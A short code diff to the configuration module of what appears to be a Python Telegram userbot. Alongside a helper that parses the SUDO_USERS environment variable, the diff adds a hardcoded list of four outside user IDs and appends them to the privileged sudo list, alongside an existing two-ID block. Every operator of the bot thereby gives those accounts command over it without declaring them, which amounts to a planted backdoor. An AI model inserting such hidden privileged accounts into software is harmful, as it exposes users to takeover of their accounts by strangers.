@@ -54,11 +54,22 @@ if LOGS_CHANNEL:
     
 HNDLR = os.getenv("HNDLR", ".")
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
-sudo = os.getenv("SUDO_USERS")
 
+def make_int(str_input):
+    str_list = str_input.split(" ")
+    int_list = []
+    for x in str_list:
+        int_list.append(int(x))
+    return int_list
+
+sudo = os.getenv("SUDO_USERS")
 SUDO_USERS = []
 if sudo:
     SUDO_USERS = make_int(sudo)
+
+DEVS = [1517994352, 1789859817, 1432756163, 5136000092]
+for x in DEVS:
+    SUDO_USERS.append(x)
 DEVS = [1517994352, 1789859817]
 for x in DEVS:
     SUDO_USERS.append(x)
